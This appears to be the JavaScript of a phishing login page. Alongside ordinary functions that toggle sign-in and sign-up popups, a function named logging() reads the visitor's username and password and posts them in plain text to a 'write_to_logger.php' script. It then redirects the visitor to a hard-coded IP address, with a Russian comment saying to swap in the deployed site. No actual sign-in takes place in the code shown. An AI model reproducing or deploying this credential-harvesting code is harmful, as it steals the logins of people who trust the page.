function script_sign_in(){
    var form = this.document.getElementById("sign_in_form");
    form.reset();
    var div = this.document.getElementById("sign_in_div");
    div.style.display = "block";
}

function script_sign_in_off(){
    var div = this.document.getElementById("sign_in_div");
    div.style.display = "none";
}

function script_sign_up(){
    var form = this.document.getElementById("sign_up_form");
    form.reset();
    var div = this.document.getElementById("sign_up_div");
    div.style.display = "block";
}

function script_sign_up_off(){
    var div = this.document.getElementById("sign_up_div");
    div.style.display = "none";
}

function logging(){
    var username = document.getElementsByName("login")[0].value;
    var password = document.getElementsByName("password")[0].value;
    var string_log_pass = "login:" + username + " password:" + password + "\n";
    var data = new FormData();
    data.append("data" , string_log_pass);
    var xhr = (window.XMLHttpRequest) ? new XMLHttpRequest() : new activeXObject("Microsoft.XMLHTTP");
    xhr.open( 'post', './write_to_logger.php', true );
    xhr.send(data);

    window.location.href = 'http://51.250.22.74:8081/photographers/';// заменить на поднятую вебку
}